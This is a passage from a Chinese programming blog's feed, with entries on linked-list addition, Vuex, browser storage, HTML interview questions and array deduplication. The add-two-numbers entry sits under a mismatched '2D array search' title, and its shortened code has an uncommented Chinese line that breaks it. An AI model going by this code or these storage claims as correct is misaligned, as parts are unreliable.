的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展："><a href="#▉-扩展：" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>剑指offer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>剑指offer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vuex使用</title>
    <link href="/hexo_blog/2021/09/03/vuex%E4%BD%BF%E7%94%A8/"/>
    <url>/hexo_blog/2021/09/03/vuex%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="vuex"><a href="#vuex" class="headerlink" title="vuex"></a>vuex</h1><ul><li>只用来读取的状态集中放在<code>store</code>中； 改变状态的方式是提交<code>mutations</code>，这是个同步的事物； 异步逻辑应该封装在<code>action</code>中。</li><li>在<code>main.js</code>引入<code>store</code>，注入。新建了一个目录<code>store</code>，<code>… export</code></li><li><strong>场景有</strong>：单页应用中，组件之间的状态、音乐播放、登录状态、加入购物车</li></ul><p><img src="http://poetries1.gitee.io/img-repo/2020/07/62.png" alt="img"></p><ul><li><code>state</code>：<code>Vuex</code> 使用单一状态树,即每个应用将仅仅包含一个<code>store</code> 实例，但单一状态树和模块化并不冲突。存放的数据状态，不可以直接修改里面的数据。</li><li><code>mutations</code>：<code>mutations</code>定义的方法动态修改<code>Vuex</code> 的 <code>store</code> 中的状态或数据</li><li><code>getters</code>：类似<code>vue</code>的计算属性，主要用来过滤一些数据。</li><li><code>action</code>：<code>actions</code>可以理解为通过将<code>mutations</code>里面处里数据的方法变成可异步的处理数据的方法，简单的说就是异步操作数据。<code>view</code> 层通过 <code>store.dispath</code> 来分发 <code>action</code></li></ul><img src="http://poetries1.gitee.io/img-repo/2020/07/63.png" alt="img" style="zoom:33%;" /><blockquote><p><code>modules</code>：项目特别复杂的时候，可以让每一个模块拥有自己的<code>state</code>、<code>mutation</code>、<code>action</code>、<code>getters</code>，使得结构非常清晰，方便管理</p></blockquote><img src="http://poetries1.gitee.io/img-repo/2020/07/64.png" alt="img" style="zoom:33%;" />]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维数组的查找 🤺</title>
    <link href="/hexo_blog/2021/09/02/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E6%9F%A5%E6%89%BE/"/>
    <url>/hexo_blog/2021/09/02/%E4%BA%8C%E7%BB%B4%E6%95%B0%E7%BB%84%E7%9A%84%E6%9F%A5%E6%89%BE/</url>
    
    <content type="html"><![CDATA[<h4 id="题目二：二维数组的查找"><a href="#题目二：二维数组的查找" class="headerlink" title="题目二：二维数组的查找"></a>题目二：二维数组的查找</h4><p>在一个二维数组中（每个一维数组的长度相同），每一行都按照从左到右递增的顺序排序，每一列都按照从上到下递增的顺序排序。请完成一个函数，输入这样的一个二维数组和一个整数，判断数组中是否含有该整数。</p><p><strong>Example:</strong></p><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Input:</span> <span class="hljs-string">(2</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">3</span><span class="hljs-string">)</span> <span class="hljs-string">+</span> <span class="hljs-string">(5</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">6</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">4</span><span class="hljs-string">)</span><span class="hljs-attr">Output:</span> <span class="hljs-number">7</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">0</span> <span class="hljs-string">-&gt;</span> <span class="hljs-number">8</span><span class="hljs-attr">Explanation:</span> <span class="hljs-number">342</span> <span class="hljs-string">+</span> <span class="hljs-number">465</span> <span class="hljs-string">=</span> <span class="hljs-number">807</span><span class="hljs-string">.</span></code></pre></div><p><strong>Solve:</strong> </p><h6 id="▉-算法思路："><a href="#▉-算法思路：" class="headerlink" title="▉ 算法思路："></a>▉ 算法思路：</h6><blockquote><p>1）观察 Example 规律，关联到链表，用一个带头的链表存储。</p><p>2）多位数加多位数，反转链表转化整数，如果整数相加，可能会溢出，此方法行不通。</p><p>3）直接进行位数运算，两链表每取出一个就做运算，将结果放入到新链表中。</p></blockquote><h6 id="▉-临界条件："><a href="#▉-临界条件：" class="headerlink" title="▉ 临界条件："></a>▉ 临界条件：</h6><blockquote><p>1）一个链表比另一个链表长；</p><p>2）其中一个链表为 null。</p><p>3）求和运算会出现额外的进位（一般进位与最高位进位两种情况）。</p></blockquote><h6 id="▉-步骤："><a href="#▉-步骤：" class="headerlink" title="▉ 步骤："></a>▉ 步骤：</h6><blockquote><p>1）遍历链表之前，要定义一个哨兵结点、临时结点、存储计算结果的结点、进位标志；</p><p>2）开始遍历数据，判断当前结点是否为 null，为 null 就用 0 代替，否则取出数值；</p><p>3）求和（加 carray 进位），判断是否进位？记录进位值；</p><p>4）求模取余，计算两位数的各位数存储到链表中，指针向后移动；</p><p>5）判断结点是否为 null，继续遍历（如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理）</p><ol start="6"><li>退出 while 循环勿忘最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位，存放到链表最后</li></ol></blockquote><h6 id="▉-代码实现："><a href="#▉-代码实现：" class="headerlink" title="▉ 代码实现："></a>▉ 代码实现：</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">/**</span><span class="hljs-comment"> * 性能分析：</span><span class="hljs-comment"> * 1)遍历整个链表，时间复杂度为 O（n）。</span><span class="hljs-comment"> * 2)需要额外的 n 大小的空间存储 计算结果结点，空间复杂度为 O(n)。</span><span class="hljs-comment"> */</span><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = <span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> num2 = <span class="hljs-number">0</span>;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 == <span class="hljs-literal">null</span></span>)</span>&#123;            num1 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num1 = l1.val;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 == <span class="hljs-literal">null</span></span>)</span>&#123;            num2 = <span class="hljs-number">0</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            num2 = l2.val;        &#125;        <span class="hljs-comment">// let num1 = l1 == null ? 0 : l1.val;</span>        <span class="hljs-comment">// let num2 = l2 == null ? 0 : l2.val;</span>        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l1 = l1.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l1 比 l2 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l1 = l1;        &#125;        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;            l2 = l2.next;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-comment">//如果链表 l2 比 l1 短,没有下一结点只能返回本身下次处理当做 null 处理</span>            l2 = l2;        &#125;        <span class="hljs-comment">// l1 为不为 null 才满足条件</span>        <span class="hljs-comment">// l1 = l1 ? l1.next : l1;</span>        <span class="hljs-comment">// l2 = l2 ? l2.next : l2;</span>    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-代码缩减"><a href="#▉-代码缩减" class="headerlink" title="▉ 代码缩减:"></a>▉ 代码缩减:</h6><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> addTwoNumbers = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">l1, l2</span>) </span>&#123;    <span class="hljs-comment">//定义哨兵结点</span>    <span class="hljs-keyword">let</span> head = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-string">&quot;head&quot;</span>);    <span class="hljs-keyword">let</span> current = head;<span class="hljs-comment">//临时指针</span>    <span class="hljs-comment">//存储计算后的链表</span>    <span class="hljs-keyword">let</span> sumNode = head;    <span class="hljs-comment">//定义进位变量</span>    <span class="hljs-keyword">let</span> carray = <span class="hljs-number">0</span>;    <span class="hljs-comment">//开始遍历两个链表取数据，判断链表是否为 null</span>    <span class="hljs-function"><span class="hljs-title">while</span>(<span class="hljs-params">l1 !== <span class="hljs-literal">null</span> || l2 !== <span class="hljs-literal">null</span></span>)</span>&#123;        <span class="hljs-comment">//判断取数据的链表是否为nulL,为 null 就用 0 替换</span>        <span class="hljs-keyword">let</span> num1 = l1 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l1.val;        <span class="hljs-keyword">let</span> num2 = l2 == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : l2.val;        <span class="hljs-comment">//计算取出的两个数值的和用于判断是否满进位，如果满 10,carray 需要记录进位,默认为 0</span>        <span class="hljs-keyword">let</span> sum = num1 + num2 + carray;        <span class="hljs-comment">//判断是否需要存储进位值 1</span>        <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">sum &gt; <span class="hljs-number">9</span></span>)</span>&#123;           carray = <span class="hljs-number">1</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            carray = <span class="hljs-number">0</span>;        &#125;        <span class="hljs-comment">//carray = sum &gt; 9 ? 1 : 0;</span>        <span class="hljs-comment">//将两数之和相加[取模(取余运算)]添加到 sumNode 新链表中,一次排列</span>        current.next = <span class="hljs-keyword">new</span> ListNode(sum % <span class="hljs-number">10</span>)        <span class="hljs-comment">//将指针指向下一链表结点</span>        current = current.next;        <span class="hljs-comment">//继续遍历链表中的数据，判断下一结点是否为 null</span>        l1 为不为 <span class="hljs-literal">null</span> 才满足条件        l1 = l1 ? l1.next : l1;        l2 = l2 ? l2.next : l2;    &#125;    <span class="hljs-comment">//最高位满位情况,carray 还存放着 1,所以判断最高位是否需要进位</span>    <span class="hljs-function"><span class="hljs-title">if</span>(<span class="hljs-params">carray === <span class="hljs-number">1</span></span>)</span>&#123;        <span class="hljs-comment">//有哨兵的，所以需要 next 才能存放下一结点</span>        current.next = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">1</span>);    &#125;    <span class="hljs-comment">//返回哨兵结点之后的链表</span>    <span class="hljs-keyword">return</span> head.next;&#125;</code></pre></div><h6 id="▉-总结：需要注意几点。"><a href="#▉-总结：需要注意几点。" class="headerlink" title="▉ 总结：需要注意几点。"></a>▉ 总结：需要注意几点。</h6><blockquote><p>1、<code> l1 = l1 ? l1.next : l1</code> 代表的是 l1 不等于 null 会去 l1.next 的值。</p><p>2、用到哨兵思想，所以注意当前的指针指向。</p><p>3、两位数取模运算。</p></blockquote><h6 id="▉-扩展："><a href="#▉-扩展：" class="headerlink" title="▉ 扩展："></a>▉ 扩展：</h6><blockquote><p>三位数怎么取得各个位置上的数字？（水仙花数）</p><p><strong>答：</strong></p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-comment">//移动小数点向前一位，得到小数点后一位</span>个位：a = <span class="hljs-number">123</span> % <span class="hljs-number">10</span> = <span class="hljs-number">3</span><span class="hljs-comment">//移动小数点向前两位，得到小数点后两位，除以10取整</span>十位：b  = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">100</span>) / <span class="hljs-number">10</span>)<span class="hljs-comment">//移动小数点向前三位，得到小数点后三位，除以100取整</span>百位:：c = <span class="hljs-built_in">parseInt</span>((<span class="hljs-number">123</span> % <span class="hljs-number">1000</span>) / <span class="hljs-number">100</span>)<span class="hljs-comment">//依次类推.....</span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>剑指offer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>剑指offer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cookies，sessionStorage 和localStorage 的区别</title>
    <link href="/hexo_blog/2021/09/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/"/>
    <url>/hexo_blog/2021/09/02/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="11-cookies，sessionStorage-和localStorage-的区别"><a href="#11-cookies，sessionStorage-和localStorage-的区别" class="headerlink" title="11.cookies，sessionStorage 和localStorage 的区别"></a>11.cookies，sessionStorage 和localStorage 的区别</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sessionStorage 和 localStorage 是 HTML5 Web Storage API 提供的，可以方便的在 web 请求之间保存数据。有了本地数据，就可以避免数据在浏览器和服务器间不必要地来回传递。</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>sessionStorage、 localStorage 、 cookie 都是在浏览器端存储的数据，其中sessionStorage 的概念很特别，引入了一个“浏览器窗口”的概念。sessionStorage 是在同源的同窗口（或 tab  ）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后， sessionStorage 即被销毁。同时“独立”打开的不同窗口，即使是同一页面， sessionStorage 对象也是不同的</p><p>cookies 会发送到服务器端。其余两个不会。</p><p>Microsoft 指出 Internet Explorer 8 增加 cookie 限制为每个域名 50 个，但 IE7<br>似乎也允许每个域名 50 个 cookie 。 Firefox 每个域名 cookie 限制为 50 个。</p><p>Opera 每个域名 cookie  限制为 30  个。 Firefox  和 Safari  允许 cookie  多达4097 个字节，包括名（ name  ）、值（ value  ）和等号。 Opera  许 cookie  多达 4096 个字节，包括：名（ name ）、值（ value  ）和等号。 Internet Explorer 允许 cookie 多达 4095 个字节，包括：名（ name ）、值（ value ）和等号。</p><blockquote><p>Cookie</p><ul><li>每个域名存储量比较小（各浏览器不同，大致 4K ）</li><li>所有域名的存储量有限制（各浏览器不同，大致 4K ）</li><li>有个数限制（各浏览器不同）</li><li>会随请求发送到服务器</li></ul><p>LocalStorage</p><ul><li>永久存储</li><li>单个域名存储量比较大（推荐 5MB ，各浏览器不同）</li><li>总体数量无限制</li></ul><p>essionStorage</p><ul><li>只在 Session 内有效</li><li>存储量更大（推荐没有限制，但是实际上各浏览器也不同）</li></ul></blockquote>]]></content>
    
    
    <categories>
      
      <category>浏览器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>浏览器</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>html面试题🦗</title>
    <link href="/hexo_blog/2021/08/17/html%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <url>/hexo_blog/2021/08/17/html%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="html面试题"><a href="#html面试题" class="headerlink" title="html面试题"></a>html面试题</h1><h2 id="html知识点总结"><a href="#html知识点总结" class="headerlink" title="html知识点总结"></a>html知识点总结</h2><p>平时遇到的面试题的一些总结</p><ol><li><p>对WEB标准以及W3C的理解与认识？</p></li><li><p>Doctype作用，HTML5 为什么只需要写 <!DOCTYPE HTML></p></li><li><p> 行内元素有哪些，块级元素有哪些，空(void)元素有那些</p></li><li><p>简述一下你对HTML语义化的理解</p></li><li><p>HTML5有哪些新特性？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></li><li><p>描述一下 cookie，sessionStorage 和 localStorage 的区别</p></li><li><p>如何实现浏览器内多个标签页之间的通信</p></li><li><p>HTML5的离线存储怎么使用，解释一下工作原理</p></li><li><p>src与href的区别</p></li><li><p>表单提交中Get和Post方式的区别</p></li><li><p>iframe有那些缺点？</p></li><li><p>语义化的理解</p></li><li><p>…</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>面试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>-面试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数组去重💪</title>
    <link href="/hexo_blog/2021/08/12/%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D/"/>
    <url>/hexo_blog/2021/08/12/%E6%95%B0%E7%BB%84%E5%8E%BB%E9%87%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="数组去重"><a href="#数组去重" class="headerlink" title="数组去重"></a>数组去重</h1><p>数组去重，一般都是在面试的时候才会碰到，一般是要求手写数组去重方法的代码。如果是被提问到，数组去重的方法有哪些？你能答出其中的10种，面试官很有可能对你刮目相看。<br>在真实的项目中碰到的数组去重，一般都是后台去处理，很少让前端处理数组去重。虽然日常项目用到的概率比较低，但还是需要了解一下，以防面试的时候可能回被问到。</p><p>注：写的匆忙，加上这几天有点忙，还没有非常认真核对过，不过思路是没有问题，可能一些小细节出错而已。</p><h2 id="数组去重的方法"><a href="#数组去重的方法" class="headerlink" title="数组去重的方法"></a>数组去重的方法</h2><h2 id="一、利用ES6-Set去重（ES6中最常用）"><a href="#一、利用ES6-Set去重（ES6中最常用）" class="headerlink" title="一、利用ES6 Set去重（ES6中最常用）"></a>一、利用ES6 Set去重（ES6中最常用）</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span> (arr) &#123;  <span class="hljs-keyword">return</span> <span class="hljs-keyword">Array</span>.<span class="hljs-keyword">from</span>(<span class="hljs-built_in">new</span> <span class="hljs-keyword">Set</span>(arr))&#125;var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];console.log(<span class="hljs-keyword">unique</span>(arr)) //[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;&#125;, &#123;&#125;]</code></pre></div><p>不考虑兼容性，这种去重的方法代码最少。这种方法还无法去掉“{}”空对象，后面的高阶方法会添加去掉重复“{}”的方法。</p><h2 id="二、利用for嵌套for，然后splice去重（ES5中最常用）"><a href="#二、利用for嵌套for，然后splice去重（ES5中最常用）" class="headerlink" title="二、利用for嵌套for，然后splice去重（ES5中最常用）"></a>二、利用for嵌套for，然后splice去重（ES5中最常用）</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr)&#123;                    <span class="hljs-keyword">for</span>(var i=<span class="hljs-number">0</span>; i&lt;arr.length; i++)&#123;            <span class="hljs-keyword">for</span>(var j=i+<span class="hljs-number">1</span>; j&lt;arr.length; j++)&#123;                <span class="hljs-keyword">if</span>(arr[i]==arr[j])&#123;         //第一个等同于第二个，splice方法删除第二个                    arr.splice(j,<span class="hljs-number">1</span>);                    j<span class="hljs-comment">--;</span>                &#125;            &#125;        &#125;<span class="hljs-keyword">return</span> arr;&#125;var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];    console.log(<span class="hljs-keyword">unique</span>(arr))    //[<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, &quot;a&quot;, &#123;…&#125;, &#123;…&#125;]     //<span class="hljs-keyword">NaN</span>和&#123;&#125;没有去重，两个<span class="hljs-keyword">null</span>直接消失了</code></pre></div><p>双层循环，外层循环元素，内层循环时比较值。值相同时，则删去这个值。<br>想快速学习更多常用的ES6语法，可以看我之前的文章<a href="https://segmentfault.com/a/1190000016068235">《学习ES6笔记──工作中常用到的ES6语法》</a>。</p><h2 id="三、利用indexOf去重"><a href="#三、利用indexOf去重" class="headerlink" title="三、利用indexOf去重"></a>三、利用indexOf去重</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">Array</span>.isArray(arr)) &#123;        console.log(<span class="hljs-string">&#x27;type error!&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    var <span class="hljs-keyword">array</span> = [];    <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">array</span> .indexOf(arr[i]) === <span class="hljs-number">-1</span>) &#123;            <span class="hljs-keyword">array</span> .push(arr[i])        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>;&#125;var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];console.log(<span class="hljs-keyword">unique</span>(arr))   // [<span class="hljs-number">1</span>, &quot;true&quot;, <span class="hljs-keyword">true</span>, <span class="hljs-number">15</span>, <span class="hljs-keyword">false</span>, undefined, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>, &quot;NaN&quot;, <span class="hljs-number">0</span>, &quot;a&quot;, &#123;…&#125;, &#123;…&#125;]  //<span class="hljs-keyword">NaN</span>、&#123;&#125;没有去重</code></pre></div><p>新建一个空的结果数组，for 循环原数组，判断结果数组是否存在当前元素，如果有相同的值则跳过，不相同则push进数组。</p><h2 id="四、利用sort"><a href="#四、利用sort" class="headerlink" title="四、利用sort()"></a>四、利用sort()</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">Array</span>.isArray(arr)) &#123;        console.log(<span class="hljs-string">&#x27;type error!&#x27;</span>)        <span class="hljs-keyword">return</span>;    &#125;    arr = arr.sort()    var arrry= [arr[<span class="hljs-number">0</span>]];    <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">1</span>; i &lt; arr.length; i++) &#123;        <span class="hljs-keyword">if</span> (arr[i] !== arr[i<span class="hljs-number">-1</span>]) &#123;            arrry.push(arr[i]);        &#125;    &#125;    <span class="hljs-keyword">return</span> arrry;&#125;     var arr = [<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-string">&#x27;true&#x27;</span>,<span class="hljs-keyword">true</span>,<span class="hljs-keyword">true</span>,<span class="hljs-number">15</span>,<span class="hljs-number">15</span>,<span class="hljs-keyword">false</span>,<span class="hljs-keyword">false</span>, undefined,undefined, <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>,<span class="hljs-string">&#x27;NaN&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>,&#123;&#125;,&#123;&#125;];        console.log(<span class="hljs-keyword">unique</span>(arr))// [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">15</span>, &quot;NaN&quot;, <span class="hljs-keyword">NaN</span>, <span class="hljs-keyword">NaN</span>, &#123;…&#125;, &#123;…&#125;, &quot;a&quot;, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">true</span>, &quot;true&quot;, undefined]      //<span class="hljs-keyword">NaN</span>、&#123;&#125;没有去重</code></pre></div><p>利用sort()排序方法，然后根据排序后的结果进行遍历及相邻元素比对。</p><h2 id="五、利用对象的属性不能相同的特点进行去重（这种数组去重的方法有问题，不建议用，有待改进）"><a href="#五、利用对象的属性不能相同的特点进行去重（这种数组去重的方法有问题，不建议用，有待改进）" class="headerlink" title="五、利用对象的属性不能相同的特点进行去重（这种数组去重的方法有问题，不建议用，有待改进）"></a>五、利用对象的属性不能相同的特点进行去重（这种数组去重的方法有问题，不建议用，有待改进）</h2><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">function</span> <span class="hljs-keyword">unique</span>(arr) &#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">Array</span>.isArray(arr)) &#123;        console.log(<span class="hljs-string">&#x27;type error!&#x27;</span>)        <span class="hljs-keyword">return</span>    &#125;    var arrry= [];     var  obj = &#123;&#125;;    <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;        <span class="hljs-keyword">if</span> (!obj[arr[i]]) &#123;            